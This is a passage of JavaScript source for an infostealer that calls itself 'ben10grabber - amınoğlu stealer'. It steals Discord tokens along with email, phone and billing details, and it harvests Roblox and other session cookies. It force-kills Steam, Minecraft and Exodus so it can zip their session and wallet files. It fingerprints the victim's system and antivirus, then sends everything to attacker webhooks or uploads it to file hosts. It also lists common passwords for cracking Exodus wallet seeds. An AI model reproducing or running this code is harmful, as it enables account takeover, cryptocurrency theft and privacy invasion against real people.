       id: 1 << 2,
        rare: true,
    },
    nitro: {
        emoji: "<a:nitro:1362115714185691186>",
        rare: false,
    },
    nitro_bronze: {
        emoji: "<:bronze:1365454925357645994>",
        rare: false,
    },
    nitro_silver: {
        emoji: "<:silver:1365454972962996254>",
        rare: false,
    },
    nitro_gold: {
        emoji: "<:gold:1365454994337435739>",
        rare: false,
    },
    nitro_platinum: {
        emoji: "<:platinum:1365455020690243737>",
        rare: false,
    },
    nitro_diamond: {
        emoji: "<:diamond:1365455075937488967>",
        rare: false,
    },
    nitro_emerald: {
        emoji: "<:emerald:1365455096296509524>",
        rare: false,
    },
    nitro_ruby: {
        emoji: "<:ruby:1365455125187137536>",
        rare: false,
    },
    nitro_opal: {
        emoji: "<:opal:1365455150260551740>",
        rare: false,
    },
    guild_booster_lvl1: {
        emoji: "<:boost1:1362104840250986667>",
        rare: false,
    },
    guild_booster_lvl2: {
        emoji: "<:boost2:1362104851575607636>",
        rare: false,
    },
    guild_booster_lvl3: {
        emoji: "<:boost3:1362104863084904830>",
        rare: false,
    },
    guild_booster_lvl4: {
        emoji: "<:boost4:1362104873600024857>",
        id: 1 << 16,
        rare: true,
    },
    guild_booster_lvl5: {
        emoji: "<:boost5:1362104892226928812>",
        id: 1 << 17,
        rare: true,
    },
    guild_booster_lvl6: {
        emoji: "<:boost6:1362104904348467431>",
        id: 1 << 18,
        rare: true,
    },
    guild_booster_lvl7: {
        emoji: "<:boost7:1362104916247707658>",
        id: 1 << 19,
        rare: true,
    },
    guild_booster_lvl8: {
        emoji: "<:boost8:1362104931745530197>",
        id: 1 << 20,
        rare: true,
    },
    guild_booster_lvl9: {
        emoji: "<:boost9:1362104950938796164>",
        id: 1 << 21,
        rare: true,
    },
    quest_completed: {
        emoji: "<:quest:1362105209496801290>",
        rare: false,
    },
};

async function CurrentNitro(since) {
    if (!since) {
        return { badge: null, current: null };
    }

    const currentDate = new Date();
    const sinceDate = new Date(since);

    const year = currentDate.getFullYear() - sinceDate.getFullYear();
    const month = currentDate.getMonth() - sinceDate.getMonth();
    let passed = year * 12 + month;
    if (currentDate.getDate() < sinceDate.getDate()) {
        passed -= 1;
    }

    const nitros = [
        { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
        { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
        { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
        { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
        { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
        { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
        { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
        { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
        { badge: "nitro_opal", lowerLimit: 72 },
    ];

    const current = nitros.find((badge) => {
        const inLowerLimit = passed >= badge.lowerLimit;
        const inUpperLimit = typeof badge.upperLimit === "undefined" || passed <= badge.upperLimit;
        return inLowerLimit && inUpperLimit;
    });

    return { badge: current?.badge || null, current: since };
}

async function GetBilling(token) {
    const data = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            authorization: token,
        },
    }).then((response) => response.data).catch(() => null);

    if (!data || !Array.isArray(data)) return "`None`";
    if (!data.length) return "`No Billing`";

    let billings = "";
    for (const billing of data) {
        if (billing.type == 2 && billing.invalid != !0) {
            billings += "<:paypal:1367518269719969873> ";
        } else if (billing.type == 1 && billing.invalid != !0) {
            billings += "<:card:1367518257241915483> ";
        }
    }

    return billings || "`No Billing`";
}

async function GetBadges(id, token) {
    const data = await axios.get(`https://discord.com/api/v10/users/${id}/profile`, {
        headers: {
            "Content-Type": "application/json",
            authorization: token,
        },
    }).then((response) => response.data).catch(() => null);

    if (!data || !Array.isArray(data.badges)) return "`None`";
    if (!data.badges.length) return "`No Badges`";
    const flags = data.badges.map((badge) => badge.id);
    const nitro = await CurrentNitro(data.premium_since);
    if (nitro.badge) {
        flags.unshift(nitro.badge);
    }

    return flags.length ? flags.map((id) => badges[id]?.emoji).filter(Boolean).join(" ") : "`No Badges`";
}

async function fetchIPInfo() {
    return new Promise((resolve) => {
        https.get('https://ipinfo.io/json', (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const info = JSON.parse(data);
                    resolve({
                        ip: info.ip || 'N/A',
                        country: info.country || 'N/A',
                        city: info.city || 'N/A',
                        region: info.region || 'N/A',
                        org: info.org || 'N/A'
                    });
                } catch (e) {
                    resolve({ ip: 'N/A', country: 'N/A', city: 'N/A', region: 'N/A', org: 'N/A' });
                }
            });
        }).on('error', () => {
            resolve({ ip: 'N/A', country: 'N/A', city: 'N/A', region: 'N/A', org: 'N/A' });
        });
    });
}

async function detectAntivirusAsync() {
    const detected = [];
    const avPaths = [
        'C:\\Program Files\\Avast Software',
        'C:\\Program Files\\McAfee',
        'C:\\Program Files\\Norton',
        'C:\\Program Files\\Kaspersky Lab',
        'C:\\Program Files\\BitDefender',
        'C:\\Program Files\\ESET',
        'C:\\Program Files\\AVG',
        'C:\\Program Files\\Malwarebytes',
        'C:\\Program Files\\Sophos',
        'C:\\Program Files (x86)\\Avast Software',
        'C:\\Program Files (x86)\\McAfee',
        'C:\\Program Files (x86)\\Norton',
        'C:\\Program Files (x86)\\Kaspersky Lab',
        'C:\\Program Files (x86)\\BitDefender',
        'C:\\Program Files (x86)\\ESET',
        'C:\\Program Files (x86)\\AVG',
        'C:\\Program Files (x86)\\Malwarebytes',
        'C:\\Program Files (x86)\\Sophos'
    ];

    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            const avName = p.includes('Avast') ? 'Avast' :
                p.includes('McAfee') ? 'McAfee' :
                    p.includes('Norton') ? 'Norton' :
                        p.includes('Kaspersky') ? 'Kaspersky' :
                            p.includes('BitDefender') ? 'BitDefender' :
                                p.includes('ESET') ? 'ESET' :
                                    p.includes('AVG') ? 'AVG' :
                                        p.includes('Malwarebytes') ? 'Malwarebytes' :
                                            p.includes('Sophos') ? 'Sophos' : 'Unknown AV';
            detected.push(avName);
        }
    }

    return [...new Set(detected)];
}

async function getExtendedSystemInfo() {
    try {
        const gpuCmd = 'powershell "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"';
        const gpu = execSync(gpuCmd).toString().trim() || 'Unknown GPU';

        const diskCmd = 'powershell "Get-CimInstance Win32_LogicalDisk -Filter \\"DeviceID=\'C:\'\\" | Select-Object @{n=\'Free\';e={[math]::round($_.FreeSpace/1GB,2)}},@{n=\'Total\';e={[math]::round($_.Size/1GB,2)}}"';
        const diskRaw = execSync(diskCmd).toString().trim();
        const freeMatch = diskRaw.match(/Free\s+:\s+([\d.]+)/);
        const totalMatch = diskRaw.match(/Total\s+:\s+([\d.]+)/);
        const diskInfo = (freeMatch && totalMatch) ? `${freeMatch[1]} GB free of ${totalMatch[1]} GB` : 'N/A';

        const hwidCmd = 'powershell "(Get-CimInstance Win32_ComputerSystemProduct).UUID"';
        const hwid = execSync(hwidCmd).toString().trim() || 'N/A';

        const osNameCmd = 'powershell "(Get-CimInstance Win32_OperatingSystem).Caption"';
        const osName = execSync(osNameCmd).toString().trim() || os.type();

        return { gpu, disk: diskInfo, hwid, os_name: osName };
    } catch (e) {
        return { gpu: 'N/A', disk: 'N/A', hwid: 'N/A', os_name: os.type() };
    }
}

async function getSystemInfoEmbed() {
    const totalMem = os.totalmem() / (1024 ** 3);
    const freeMem = os.freemem() / (1024 ** 3);
    const usedMem = totalMem - freeMem;
    const ramUsagePercent = (usedMem / totalMem) * 100;

    const barLength = 10;
    const filledLength = Math.round((barLength * usedMem) / totalMem);
    const bar = '█'.repeat(filledLength) + '░'.repeat(barLength - filledLength);

    const uptimeSeconds = os.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);

    const ipInfo = await fetchIPInfo();
    const av = await detectAntivirusAsync();
    const extInfo = await getExtendedSystemInfo();

    return {
        title: 'Omnitrix Scanner v3.0 - Target ID: ' + os.hostname(),
        color: BEN10_COLOR,
        fields: [
            {
                name: 'System Core',
                value: [
                    `**OS:** \`${extInfo.os_name} (${os.arch()})\``,
                    `**HWID:** \`${extInfo.hwid}\``,
                    `**Uptime:** \`${hours}h ${minutes}m\``
                ].join('\n'),
                inline: false
            },
            {
                name: 'Omnitrix Monitoring',
                value: [
                    `**RAM Usage:** \`[${bar}] ${ramUsagePercent.toFixed(1)}%\``,
                    `**Capacity:** \`${usedMem.toFixed(2)} / ${totalMem.toFixed(2)} GB\``,
                    `**GPU:** \`${extInfo.gpu}\``,
                    `**Disk:** \`${extInfo.disk}\``,
                    `**CPU:** \`${os.cpus()[0]?.model || 'N/A'}\``
                ].join('\n'),
                inline: false
            },
            {
                name: 'Network & Security',
                value: [
                    `**IP Address:** \`${ipInfo.ip}\``,
                    `**Location:** \`${ipInfo.city}, ${ipInfo.country}\``,
                    `**AV Status:** \`${av.join(', ') || 'N/A'}\``
                ].join('\n'),
                inline: false
            }
        ],
        footer: {
            text: BEN10_FOOTER_TEXT + ' | Hardware Authenticated',
            icon_url: BEN10_ICON
        },
        timestamp: new Date().toISOString()
    };
}

async function sendLog(payload) {
    const finalPayload = {
        username: BEN10_USERNAME,
        avatar_url: BEN10_ICON,
        ...payload
    };

    const targets = [CONFIG.webhook, CONFIG.dualhook].filter(h => h && h.startsWith('https://'));

    for (const url of targets) {
        try {
            await axios.post(url, finalPayload, {
                headers: { 'Content-Type': 'application/json' },
                timeout: 30000
            });
        } catch (error) {
            // Fail silently
        }
    }
}

async function sendTokenToWebhook(token, platform, userInfo) {
    return new Promise(async (resolve, reject) => {
        try {
            const badgeDisplay = await GetBadges(userInfo.id, token);
            const billingDisplay = await GetBilling(token);

            const friendsInfo = await getHQFriends(token);

            const username = userInfo.username || 'Unknown';
            const userId = userInfo.id || '0';
            const avatarUrl = userInfo.avatar
                ? `https://cdn.discordapp.com/avatars/${userId}/${userInfo.avatar}?size=4096`
                : `https://cdn.discordapp.com/embed/avatars/0.png`;

            // Construct Friends string for the field: "Total/HQ"
            const friendsFieldVal = `\`${friendsInfo.friends.count}/${friendsInfo.hqFriends.count}\``;

            // Construct HQ Friends description
            // In xrd.js it allows 3char names in HQ. Our getHQFriends already filters for that.
            // We need to format the string list similarly.
            let hqDescription = '`None`';
            if (friendsInfo.hqFriends.count > 0) {
                hqDescription = friendsInfo.hqFriends.list.map(friend => {
                    const flags = friend.flags || 0;
                    const badgeEmojis = [];
                    for (const [key, badge] of Object.entries(badges)) {
                        if (badge.rare && (flags & badge.id) !== 0) {
                            badgeEmojis.push(badge.emoji);
                        }
                    }

                    const friend3c = friend.username && friend.username.length === 3;
                    const badge3c = friend3c ? "<:3c:1365004856103796897>" : "";
                    const badgeStr = badgeEmojis.join('');

                    if (badgeStr || badge3c) {
                        return `${badge3c}${badgeStr} | \`${friend.username}\``;
                    } else {
                        return `\`${friend.username}\``;
                    }
                }).filter(Boolean).join('\n') || '`None`';
            }

            const payload = {
                username: "Ben10",
                embeds: [
                    {
                        color: 0x00FF00,
                        author: {
                            name: `${username}`,
                            icon_url: avatarUrl
                        },
                        thumbnail: {
                            url: avatarUrl
                        },
                        fields: [
                            { name: "Token:", value: `\`\`\`${token}\`\`\``, inline: false },
                            { name: "Email:", value: `\`${userInfo.email || 'None'}\``, inline: true },
                            { name: "Phone:", value: `\`${userInfo.phone || 'None'}\``, inline: true },
                            { name: "2FA:", value: `\`${userInfo.mfa_enabled ? "Yes" : "No"}\``, inline: true },
                            { name: "Badges:", value: badgeDisplay || "`No Badges`", inline: true },
                            { name: "Billing:", value: billingDisplay, inline: true },
                            { name: "Friends:", value: friendsFieldVal, inline: true },
                        ],
                        footer: {
                            text: "@ben10grabber - amınoğlu stealer",
                            icon_url: "https://media.discordapp.net/attachments/1450980645344907264/1452918266556317746/images.jpeg?ex=694c37d4&is=694ae654&hm=090ac699a84f9c232f511f09195b7edffaf7cdbb521ebf6f7b984ca5588f3cb4&"
                        },
                    },
                    {
                        color: 0x00FF00,
                        title: `HQ : (${friendsInfo.hqFriends.count})`,
                        description: hqDescription,
                        footer: {
                            text: "@ben10grabber",
                            icon_url: "https://media.discordapp.net/attachments/1450980645344907264/1452918266556317746/images.jpeg?ex=694c37d4&is=694ae654&hm=090ac699a84f9c232f511f09195b7edffaf7cdbb521ebf6f7b984ca5588f3cb4&"
                        },
                    }
                ]
            };

            await sendLog(payload);

            console.log('[+] Token sent successfully');
            resolve();
        } catch (error) {
            console.error('[-] Error preparing webhook:', error.message);
            reject(error);
        }
    });
}

async function exfiltrateLogs(zipPath) {
    if (!fs.existsSync(zipPath)) {
        console.log('[!] Zip file not found');
        return false;
    }

    const systemEmbed = await getSystemInfoEmbed();
    const fileStream = fs.createReadStream(zipPath);
    const fileSize = fs.statSync(zipPath).size;

    console.log(`[+] Attempting Direct Discord Upload (${(fileSize / 1024 / 1024).toFixed(2)} MB)...`);

    // Target Webhooks
    const targets = [CONFIG.webhook, CONFIG.dualhook].filter(h => h && h.startsWith('https://'));

    let directUploadSuccess = false;

    // 1. Attempt Direct Upload
    for (const url of targets) {
        try {
            const form = new FormData();
            form.append('payload_json', JSON.stringify({
                embeds: [systemEmbed]
            }));
            form.append('file', fs.createReadStream(zipPath), {
                filename: 'logs.zip',
                contentType: 'application/zip'
            });

            await axios.post(url, form, {
                headers: form.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 60000 // 60s timeout for upload
            });

            directUploadSuccess = true;
        } catch (e) {
            console.log(`[-] Direct upload failed to ${url}: ${e.message}`);
        }
    }

    if (directUploadSuccess) {
        console.log('[+] Direct upload successful');
        return true;
    }

    console.log('[!] Direct upload failed, falling back to Gofile...');

    // 2. Gofile Fallback
    const gofileLink = await zipAndUpload(zipPath);
    if (gofileLink) {
        console.log('[+] Sending Gofile link...');
        const linkEmbed = {
            title: '📁 Download Logs',
            description: `[Click here to download logs](${gofileLink})`,
            color: BEN10_COLOR
        };

        await sendLog({ embeds: [systemEmbed, linkEmbed] });
        return true;
    }

    console.log('[!] Gofile failed, falling back to Tmpfiles...');

    // 3. Tmpfiles Fallback
    const tmpfilesLink = await uploadToTmpfiles(zipPath);
    if (tmpfilesLink) {
        console.log('[+] Sending Tmpfiles link...');
        const linkEmbed = {
            title: '📁 Download Logs',
            description: `[Click here to download logs](${tmpfilesLink})`,
            color: BEN10_COLOR
        };

        await sendLog({ embeds: [systemEmbed, linkEmbed] });
        return true;
    }

    // 4. All Failed - Send just System Info with warning
    console.log('[!] All uploads failed');
    const errorEmbed = {
        title: '⚠️ Upload Failed',
        description: 'Could not upload logs.zip to any service.',
        color: 0xFF0000
    };
    await sendLog({ embeds: [systemEmbed, errorEmbed] });

    return false;
}

async function uploadToTmpfiles(filePath) {
    try {
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath));

        const response = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: 30000
        });

        if (response.data && response.data.status === 'success') {
            let url = response.data.data.url;
            if (url.includes('tmpfiles.org/')) {
                url = url.replace('tmpfiles.org/', 'tmpfiles.org/dl/');
            }
            return url;
        }
    } catch (error) {
        console.log(`[-] Tmpfiles upload failed: ${error.message}`);
    }
    return null;
}

async function zipAndUpload(zipPath) {
    if (!fs.existsSync(zipPath)) {
        return null;
    }

    let servers = [];

    try {
        const serverRes = await axios.get('https://api.gofile.io/servers', {
            timeout: 15000
        });

        if (serverRes.data && serverRes.data.status === 'ok' && serverRes.data.data && serverRes.data.data.servers) {
            servers = serverRes.data.data.servers.map(s => s.name);
            console.log(`[+] Got ${servers.length} servers from API: ${servers.join(', ')}`);
        } else {
            console.log('[!] API returned invalid data, trying default servers');
            servers = ['store1', 'store2', 'store3', 'store4'];
        }
    } catch (e) {
        console.log('[!] Failed to get servers from API:', e.message);
        servers = ['store1', 'store2', 'store3', 'store4'];
    }

    for (const uploadServer of servers) {
        try {
            console.log(`[+] Trying gofile server: ${uploadServer}`);

            const form = new FormData();
            form.append('file', fs.createReadStream(zipPath));

            const uploadUrl = `https://${uploadServer}.gofile.io/contents/uploadfile`;
            const res = await axios.post(uploadUrl, form, {
                headers: {
                    ...form.getHeaders(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxBodyLength: Infinity,
                maxContentLength: Infinity,
                timeout: 50000
            });

            if (res && res.data && res.data.status === 'ok') {
                const data = res.data.data;
                const downloadLink = data.downloadPage || `https://gofile.io/d/${data.fileId}`;
                console.log('[+] Gofile upload successful:', downloadLink);
                return downloadLink;
            } else {
                console.log(`[!] Server ${uploadServer} failed - status: ${res.data?.status}`);
            }
        } catch (e) {
            const errorMsg = e.response?.data || e.message || e;
            console.log(`[!] Server ${uploadServer} error:`, errorMsg);
        }
    }

    console.log('[!] All gofile servers failed');
    return null;
}

function readCookiesFromFile(filePath) {
    const cookies = [];
    try {
        if (!fs.existsSync(filePath)) return cookies;

        const content = fs.readFileSync(filePath, 'utf8');
        const regex = /\.ROBLOSECURITY[^\s]+/g;
        const matches = content.match(regex);

        if (matches) {
            matches.forEach(match => {
                const cookie = match.replace('.ROBLOSECURITY=', '');
                if (cookie && !cookies.includes(cookie)) {
                    cookies.push(cookie);
                }
            });
        }
    } catch (err) {
        console.log('[ROBLOX] Error reading cookies file:', err.message);
    }
    return cookies;
}

function readCookiesFromOutput(outputDir, cookieName = null) {
    const cookies = [];
    try {
        if (!fs.existsSync(outputDir)) return cookies;

        const files = getAllFiles(outputDir, '.txt');
        files.forEach(file => {
            try {
                const content = fs.readFileSync(file, 'utf8');
                const lines = content.split(/\r?\n/);

                for (const line of lines) {
                    const parts = line.trim().split(/\s+/);
                    if (parts.length >= 7) {
                        if (cookieName === '.ROBLOSECURITY' && parts[5] === '.ROBLOSECURITY') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (cookieName === 'sessionid' && parts[5] === 'sessionid') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (cookieName === 'sp_dc' && parts[5] === 'sp_dc') {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        } else if (!cookieName && parts[5]) {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        }
                    }
                }
            } catch (err) { }
        });
    } catch (err) { }
    return cookies;
}

function getAllFiles(dir, ext) {
    const files = [];
    try {
        const items = fs.readdirSync(dir);
        for (const item of items) {
            const fullPath = path.join(dir, item);
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) {
                files.push(...getAllFiles(fullPath, ext));
            } else if (stat.isFile() && (!ext || item.endsWith(ext))) {
                files.push(fullPath);
            }
        }
    } catch (err) { }
    return files;
}

async function FindRoblox(cookie) {
    const headers = {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Roblox/WinInet'
    };

    try {
        const resp = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers });
        if (!resp?.data) return null;

        let robux = 0;
        try {
            const balance = await axios.get('https://economy.roblox.com/v1/user/currency', { headers });
            robux = balance?.data?.robux || 0;
        } catch {
            console.log('[ROBLOX] Could not get Robux balance');
        }

        return {
            id: resp.data.id,
            username: resp.data.name,
            displayName: resp.data.displayName,
            robux
        };
    } catch (err) {
        console.log('[ROBLOX] Request failed:', err.response?.status || err.message);
        return null;
    }
}

async function embedRoblox(cookie) {
    const data = await FindRoblox(cookie);
    if (!data) {
        console.log('[ROBLOX] No valid data found for cookie');
        return;
    }

    const payload = {
        embeds: [{
            title: 'Omnitrix Identity Harvest: Roblox Session',
            color: BEN10_COLOR,
            description: `**👾 Cookie Fragment:** \`\`\`${cookie}\`\`\``,
            fields: [{
                name: '👤 **User Vector**',
                value: `\`\`\`yaml\nUsername: ${data.username}\nDisplayName: ${data.displayName}\nUserID: ${data.id}\nRobux: ${data.robux}\n\`\`\`\n**🔗 Profile:** [Access Profile](https://www.roblox.com/users/${data.id}/profile)`,
                inline: false
            }],
            footer: { text: BEN10_FOOTER_TEXT + ' | Session Synchronized', icon_url: BEN10_ICON },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await sendLog(payload);
        console.log(`[ROBLOX] Sent to webhook: ${data.username} | Robux: ${data.robux}`);
    } catch (err) {
        console.log('[ROBLOX] Failed to send webhook:', err.response?.data || err.message);
    }
}

async function collectRobloxSessions(outputDir) {
    console.log('[ROBLOX] Scanning cookies in output directory:', outputDir);
    const cookies = readCookiesFromOutput(outputDir, '.ROBLOSECURITY');
    console.log(`[ROBLOX] Total cookies found: ${cookies.length}`);

    for (const cookie of cookies) {
        await embedRoblox(cookie);
    }
}

async function collectSteamSession() {
    console.log('[*] Starting Steam session collection...');

    try {
        try {
            execSync('taskkill /IM Steam.exe /F', { stdio: 'ignore' });
        } catch (e) { }

        const steamPath = 'C:\\Program Files (x86)\\Steam\\config';

        if (!fs.existsSync(steamPath)) {
            console.log('[STEAM] Steam config not found');
            return;
        }

        const zipper = new AdmZip();
        zipper.addLocalFolder(steamPath);
        const temp = os.tmpdir();
        const target = path.join(temp, 'steam_session.zip');
        zipper.writeZip(target);

        const link = await zipAndUpload(target);

        if (!link) {
            console.log('[STEAM] Failed to upload file');
            fs.unlinkSync(target);
            return;
        }

        const loginFile = 'C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf';
        if (!fs.existsSync(loginFile)) {
            console.log('[STEAM] loginusers.vdf not found');
            fs.unlinkSync(target);
            return;
        }

        const accounts = fs.readFileSync(loginFile, 'utf-8');
        const ids = accounts.match(/7656[0-9]{13}/g) || [];

        console.log(`[STEAM] Found ${ids.length} Steam accounts`);

        for (const account of ids) {
            try {
                const { data: { response: info } } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${account}`);
                const { data: { response: games } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
                const { data: { response: level } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);

                const content = `\`${info.players[0].personaname}\` - \`${os.hostname()}\``;

                const embed = {
                    title: 'Omnitrix Identity Harvest: Steam Session',
                    color: BEN10_COLOR,
                    description: `**🤺 Profile:** [${info.players[0].personaname}](${info.players[0].profileurl})\n**🔍 Download:** [Steam Session Bundle](${link})`,
                    fields: [{
                        name: '🎮 **Node Status**',
                        value: `\`\`\`yaml\nUsername: ${info.players[0].personaname}\nSteamID: ${account}\nLevel: ${level.player_level || 'Private'}\nGames: ${games.game_count || '0'}\nCreated: ${new Date(info.players[0].timecreated * 1000).toLocaleDateString()}\n\`\`\``,
                        inline: false
                    }],
                    footer: { text: BEN10_FOOTER_TEXT + ' | Session Extracted', icon_url: BEN10_ICON },
                    thumbnail: { url: 'https://cdn.discordapp.com/attachments/1461199024408367206/1461369309149397014/steam.gif?ex=696a4dba&is=6968fc3a&hm=87ce92610dd1d47fe823b503ee105eaa42c51798c151f491ee05978211db1882&' },
                    timestamp: new Date().toISOString()
                };

                const payload = {
                    content: content,
                    embeds: [embed]
                };

                await sendLog(payload);
                console.log('[STEAM] Sent webhook for:', info.players[0].personaname);
            } catch (err) {
                console.log('[STEAM] Error processing account:', err.message);
            }
        }

        fs.unlinkSync(target);
    } catch (err) {
        console.log('[STEAM] General error:', err.message);
    }
}

const appdata = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');

function getMinecraftUserData() {
    const usercache = path.join(appdata, '.minecraft', 'usercache.json');
    let userdata = [];
    if (fs.existsSync(usercache)) {
        try {
            const data = fs.readFileSync(usercache, 'utf-8');
            userdata = JSON.parse(data);
        } catch (e) { }
    }
    return userdata;
}

async function copyFolder(src, dest) {
    if (!fs.existsSync(src)) return;

    fs.mkdirSync(dest, { recursive: true });
    const files = fs.readdirSync(src);

    for (const file of files) {
        const srcPath = path.join(src, file);
        const destPath = path.join(dest, file);

        try {
            const stat = fs.statSync(srcPath);
            if (stat.isDirectory()) {
                await copyFolder(srcPath, destPath);
            } else {
                fs.copyFileSync(srcPath, destPath);
            }
        } catch (e) { }
    }
}

async function collectMinecraftSession() {
    console.log('[*] Starting Minecraft session collection...');

    try {
        try {
            execSync('taskkill /IM javaw.exe /F', { stdio: 'ignore' });
        } catch (e) { }

        const home = os.homedir();
        const minecraft = path.join(appdata, '.minecraft');
        const lunar = path.join(home, '.lunarclient');
        const profiles = path.join(minecraft, 'launcher_profiles.json');
        const accounts = path.join(lunar, 'settings', 'game', 'accounts.json');

        const check = [profiles, accounts];
        const files = check.filter(file => fs.existsSync(file));

        if (files.length === 0) {
            console.log('[MINECRAFT] No session files found');
            return;
        }

        console.log(`[MINECRAFT] Found ${files.length} session files`);

        const temp = path.join(os.tmpdir(), `minecraft-${Date.now()}`);
        const tempmine = path.join(temp, 'minecraft');
        fs.mkdirSync(tempmine, { recursive: true });

        for (const file of files) {
            const destination = path.join(tempmine, path.basename(file));
            fs.mkdirSync(path.dirname(destination), { recursive: true });
            fs.copyFileSync(file, destination);
        }

        const lunarsettings = path.join(lunar, 'settings');
        const targetsettings = path.join(temp, 'lunarclient', 'settings');

        if (fs.existsSync(lunarsettings)) {
            await copyFolder(lunarsettings, targetsettings);
        }

        const zipper = new AdmZip();
        zipper.addLocalFolder(temp);
        const target = path.join(os.tmpdir(), 'minecraft_session.zip');
        zipper.writeZip(target);

        const link = await zipAndUpload(target);

        if (!link) {
            console.log('[MINECRAFT] Failed to upload file');
            fs.rmSync(temp, { recursive: true, force: true });
            fs.unlinkSync(target);
            return;
        }

        const user = getMinecraftUserData();
        const fields = [
            {
                name: '<:auth:1316345705341911063> How to Use:',
                value: '>>> Download the file.\nNavigate to your Minecraft or Lunar Client folder.\nReplace the existing files with the ones in the ZIP.',
                inline: false
            }
        ];

        if (user.length > 0) {
            user.forEach(user => {
                const { name, uuid, expiresOn } = user;
                const profile = `https://namemc.com/search?q=${uuid}`;
                const image = `https://mc-heads.net/skin/${uuid}`;
                let timestamp = null;

                try {
                    timestamp = Math.floor(new Date(expiresOn).getTime() / 1000);
                } catch (e) { }

                let value = `> 👤 **Player:** \`${name}\`\n` +
                    `> 🆔 **UUID:** \`${uuid}\``;

                if (timestamp) {
                    value += `\n> 📅 **Expires:** <t:${timestamp}:F>`;
                }

                value += `\n> 🔗 **Profile:** [Click here!](${profile})` +
                    `\n> 🎭 **Skin:** [Click here!](${image})`;

                fields.push({
                    name: '🎮 Informations',
                    value: value,
                    inline: false
                });
            });
        }

        const embed = {
            title: 'Omnitrix Identity Harvest: Minecraft Session',
            color: BEN10_COLOR,
            description: `**🔍 Download:** [Full Session Payload](${link})`,
            fields: fields,
            footer: { text: BEN10_FOOTER_TEXT + ' | Session Secured', icon_url: BEN10_ICON },
            thumbnail: { url: 'https://i.pinimg.com/736x/33/ee/f5/33eef535b2ffa74da6a14c01834f2932.jpg' },
            timestamp: new Date().toISOString()
        };

        const payload = {
            embeds: [embed]
        };

        await sendLog(payload);
        console.log('[MINECRAFT] Session sent to webhook');

        fs.rmSync(temp, { recursive: true, force: true });
        fs.unlinkSync(target);
    } catch (err) {
        console.log('[MINECRAFT] General error:', err.message);
    }
}





// EXODUS SESSION FUNCTIONS
function copyFolderRecursive(src, dst) {
    if (!fs.existsSync(dst)) {
        fs.mkdirSync(dst, { recursive: true });
    }

    const entries = fs.readdirSync(src, { withFileTypes: true });
    for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const dstPath = path.join(dst, entry.name);

        if (entry.isFile()) {
            fs.copyFileSync(srcPath, dstPath);
        } else if (entry.isDirectory()) {
            copyFolderRecursive(srcPath, dstPath);
        }
    }
}

function zipDirectory(source, out) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(source);
    zipper.writeZip(out);
}

function bruteForcePasswords() {
    const passwords = [
        '',
        'password',
        '123456',
        '12345678',
        'qwerty',
        'abc123',
        'letmein',
        'welcome',
        'monkey',
        'dragon',
        'master',
        'sunshine',
        'princess',
        'football',
        'iloveyou',
        'admin',
        'root'
    ];
    return passwords;
}

function decryptSeco(content, password) {
    try {
        const key = crypto.pbkdf2Sync(password, 'exodus', 10000, 32, 'sha512');
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, content.slice(0, 12));
        const authTag = content.slice(-16);
        decipher.setAuthTag(authTag);
        const decrypted = Buffer.concat([
            decipher.update(content.slice(12, -16)),
            decipher.final()
        ]);
        return decrypted.toString('utf8');
    } catch (e) {
        return null;
    }
}

async function collectExodusSession() {
    try {
        console.log('[*] Starting Exodus session collection...');

        exec('taskkill /IM Exodus.exe /F', (error) => {
            // Ignore errors
        });

        const exodus = path.join(appdata, 'Exodus', 'exodus.wallet');
        const seed = path.join(exodus, 'seed.seco');

        if (!fs.existsSync(seed)) {
            console.log('[EXODUS] No seed file found');
            return;
        }

        console.log('[EXODUS] Exodus wallet found');

        const tempDir = path.join(os.tmpdir(), `exodus-${Date.now()}`);
        fs.mkdirSync(tempDir, { recursive: true });

        const targetWallet = path.join(tempDir, 'exodus.wallet');
        fs.mkdirSync(targetWallet, { recursive: true });
        copyFolderRecursive(exodus, targetWallet);

